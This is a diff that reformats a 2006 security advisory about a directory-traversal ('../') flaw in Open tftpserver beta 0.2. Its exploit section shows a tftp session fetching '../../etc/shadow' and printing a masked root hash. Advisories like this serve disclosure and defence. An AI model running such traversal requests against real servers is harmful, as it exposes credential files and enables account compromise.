@@ -1,32 +1,37 @@
-                                Advisory #: 46
- Title: Open tftpserver dot dot vulnerability
- Author:Larry W. Cashdollar, @_larry0
- Date: 2006-03-24
- Download Site: http://sourceforge.net/projects/tftp-server/
- Vendor:achaldhir
- Vendor Notified: 2006-03-24
- Vendor Contact: http://sourceforge.net/u/achaldhir/profile/
- Description: MultiThreaded TFTP Server Open Source Freeware Windows/Unix for
- PXEBOOT, firmware load, support tsize, blksize, timeout Server Port Ranges,
- Block Number Rollover for Large Files. Runs as Service/daemon. Single Port
- version also available.
- Vulnerability:
- tftpserver beta 0.2 is vulnerable to the ../ bug because it does not sanitize
- user input.
- CVE-
- JSON:Export
- Exploit Code:
+
+                               Advisory #: 46
+
+   Title: Open tftpserver dot dot vulnerability
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2006-03-24
+   Download Site: http://sourceforge.net/projects/tftp-server/
+   Vendor: achaldhir
+   Vendor Notified: 2006-03-24
+   Vendor Contact: http://sourceforge.net/u/achaldhir/profile/
+   Description: MultiThreaded TFTP Server Open Source Freeware
+   Windows/Unix for PXEBOOT, firmware load, support tsize, blksize,
+   timeout Server Port Ranges, Block Number Rollover for Large Files. Runs
+   as Service/daemon. Single Port version also available.
+   Vulnerability:
+   tftpserver beta 0.2 is vulnerable to the ../ bug because it does not
+   sanitize user input.
+   CVE-
+   JSON: Export
+   Exploit Code:
+
     1. root@pangea:/home/done/tftpserver# tftp 192.168.0.26
-    2.  
+    2.
     3. tftp> get ../../etc/shadow
-    4.  
+    4.
     5. Received 652 bytes in 0.0 seconds
-    6.  
+    6.
     7. tftp> quit
-    8.  
+    8.
     9. root@debian:/home/done/tftpserver# head shadow
-   10.  
+   10.
    11. root:$1XXXXXXXXXXXXXXXXXXX:13046:0:99999:7:::
- Screen Shots:
- Advisory: http://www.vapid.dhs.org/advisories/
- tftpserver_dot_dot_vulnerability.html
+
+   Screen Shots:
+   Advisory:
+   http://www.vapid.dhs.org/advisories/tftpserver_dot_dot_vulnerability.ht
+   ml
